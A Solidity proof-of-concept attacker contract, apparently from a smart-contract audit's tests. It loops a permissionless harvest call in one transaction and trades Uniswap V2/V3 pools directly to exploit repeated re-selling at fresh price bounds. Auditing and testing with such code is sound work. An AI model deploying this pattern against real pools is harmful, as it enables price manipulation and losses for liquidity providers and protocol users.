// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAudit4Harvest {
    function harvest(address pool) external returns (uint256, uint256);
}

interface IAudit4V2Pair {
    function token0() external view returns (address);
    function getAmountOut(uint256 amountIn, address tokenIn) external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IAudit4V3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 limit, bytes calldata data)
        external
        returns (int256, int256);
}

/// @dev Audit 4 attacker: loops a permissionless harvest in one transaction and trades V2/V3 pools directly.
contract Audit4Attacker {
    uint160 internal constant MIN_SQRT_RATIO_PLUS_ONE = 4295128740;
    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970341;
    address private activePool;

    /// @notice Calls harvest `n` times in one transaction (each call re-sells the carried MEME at a fresh bound).
    function loopHarvest(address locker, address pool, uint256 n) external {
        for (uint256 i; i < n; ++i) IAudit4Harvest(locker).harvest(pool);
    }

    function v2SwapIn(address pair, address tokenIn, uint256 amountIn) external returns (uint256 out) {
        out = IAudit4V2Pair(pair).getAmountOut(amountIn, tokenIn);
        IERC20(tokenIn).transfer(pair, amountIn);
        if (tokenIn == IAudit4V2Pair(pair).token0()) IAudit4V2Pair(pair).swap(0, out, address(this), "");
        else IAudit4V2Pair(pair).swap(out, 0, address(this), "");
    }

    function v3SwapIn(address pool, bool zeroForOne, uint256 amountIn) external returns (int256 a0, int256 a1) {
        activePool = pool;
        (a0, a1) = IAudit4V3Pool(pool).swap(
            address(this),
            zeroForOne,
            int256(amountIn),
            zeroForOne ? MIN_SQRT_RATIO_PLUS_ONE : MAX_SQRT_RATIO_MINUS_ONE,
            ""
        );
        activePool = address(0);
    }

    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata) external {
        require(msg.sender == activePool, "pool");
        if (a0 > 0) IERC20(IAudit4V3Pool(msg.sender).token0()).transfer(msg.sender, uint256(a0));
        if (a1 > 0) IERC20(IAudit4V3Pool(msg.sender).token1()).transfer(msg.sender, uint256(a1));
    }
}
